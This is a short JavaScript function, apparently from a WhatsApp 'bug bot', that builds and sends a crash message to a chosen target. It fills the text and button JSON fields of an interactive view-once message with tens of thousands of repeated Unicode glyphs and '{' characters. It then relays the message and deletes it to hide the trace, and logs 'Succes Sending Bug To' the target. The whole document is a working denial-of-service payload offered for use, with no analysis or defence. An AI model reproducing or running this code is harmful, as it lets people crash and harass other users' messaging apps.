async function XProtexCallV5(target) {
 try {
  const msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "",
              hasMediaAttachment: false,
            },
            body: { 
              text: "</🧬⃟༑⌁⃰𝙓𝙋𝙧𝙤𝙩𝙚𝙭𝙂𝙡𝙤𝙬ཀ͜͡\\>" + "ោ៝".repeat(20000),
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(20000),
              buttons: [
                { 
                  name: "single_select", 
                  buttonParamsJson: VaxzyFcApi + "{".repeat(20000),
                },
                { 
                  name: "call_permission_request", 
                  buttonParamsJson: VaxzyFcApi + "{".repeat(20000),
                },
              ],
            },
          }
        }
      }
    },
    {}
  );

  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
  //yang di bawah ini yang bikin delete message
  await sock.sendMessage(target, { delete: msg.key });
  console.log(chalk.red(`Succes Sending Bug To ${target}`));
 } catch (err) {
    console.error("Terdapat Kesalahan Pada Struktur Function", err);
    throw err;
  }
}